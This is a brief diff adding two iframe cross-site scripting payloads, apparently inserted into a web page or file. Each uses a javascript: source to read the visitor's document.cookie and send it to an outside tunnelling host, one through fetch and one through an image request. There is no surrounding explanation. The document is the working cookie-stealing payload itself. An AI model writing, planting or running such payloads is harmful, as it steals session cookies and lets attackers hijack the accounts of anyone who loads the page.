@@ -1,0 +1,4 @@
+<iframe src="javascript:var i=' ' + document.cookie; alert(i); fetch('http://pip3lee101-64604.portmap.host:64604/?sam')">
+
+
+<iframe src="javascript:let i=new Image;i.src='http://pip3lee101-64604.portmap.host:64604/?lee101'+document.cookie; console.log(document.cookie);" >
